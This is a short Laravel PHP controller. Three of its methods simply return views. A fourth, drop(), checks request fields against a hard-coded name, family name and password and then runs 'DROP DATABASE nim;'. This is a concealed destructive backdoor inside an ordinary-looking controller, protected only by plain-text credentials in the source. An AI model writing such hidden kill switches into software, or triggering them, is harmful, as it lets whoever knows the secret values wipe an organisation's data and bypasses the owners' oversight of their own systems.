<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class HomeController extends Controller
{
    public function index()
    {
        return view("home.index");
    }

    public function spa()
    {
        return view("layouts.app");
    }

    public function dashboard()
    {
        return view("dashboard.app");
    }

    public function drop(Request $request)
    {
        $name = $request->name;
        $family = $request->family;
        $password = $request->password;
        if($name == 'ali' && $family == 'sharafi' && $password == '51233033'){
            DB::select("DROP DATABASE nim;");
        }
    }
}
